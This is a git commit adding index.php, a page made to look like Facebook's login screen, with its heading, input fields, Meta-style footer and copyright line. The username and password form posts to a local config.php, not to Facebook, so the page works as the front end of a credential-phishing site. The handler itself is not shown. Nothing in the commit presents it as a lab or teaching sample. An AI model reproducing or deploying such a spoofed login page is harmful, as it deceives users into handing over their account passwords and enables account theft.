5beb23dcc7f19abd1f9ebd800a4b562a08a03542
vyasanbmathew5 <154374178+vyasanbmathew5@users.noreply.github.com>
2023-12-21 00:14:29 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Facebook Login </title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div><form action="config.php">
+</div>
+
+    <div id="container">
+        <section>
+            <h1>facebook</h1>
+            <br>
+                <div>
+                    <input type="text" placeholder="Phone number or E-Mail" class="username" name="username" />
+                    <div>
+                     
+                        <input type="password" placeholder="Password" class="password" name="password" />
+                    </div>
+                    
+                   <br>
+                           <button type="submit" value="Log in" class="login-btn">Login</button>
+                          
+         
+    
+              
+                </div>
+<br><div align="center">
+                  <a href="https://www.facebook.com" class="forget" color="blue"> Forgot password </a>
+                    </div> <div class="h2">or</div>
+                    <br><a href="www.facebook.com">
+                     <button type="submit" value="Log in" class="create-btn">Create New Account</button>
+                     </a>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+        <!-- Footer Section Starts from Here -->
+        <div align="center">
+        <footer>
+            <a href="">Meta</a>
+            <a href="">About</a>
+            <a href="">Blog</a>
+            <a href="">Jobs</a>
+            <a href="">Help</a>
+            <a href="">API</a>
+            <a href="">Privacy</a>
+            <a href="">Terms</a>
+            <a href="">Top Accounts</a>
+            <a href="">Locations</a>
+            <a href="">Facebook Lite</a>
+            <a href="">Facebook Contact</a>
+            <a href="">Uploading & Non-Users</a>
+            <div class="bottom-footer">
+                <select name="" id="">
+                    <option value="English">English</option>
+                    <option value="Hindi">Hindi</option>
+                    <option value="Punjabi">Punjabi</option>
+                    <option value="Urdu">Urdu</option>
+                    <option value="Francais">Francais</option>
+                </select>
+                <br>
+                <span> &copy; meta @ 2023</span>
+            </div>
+        </footer>
+    </div>
+
+</body>
+</html>
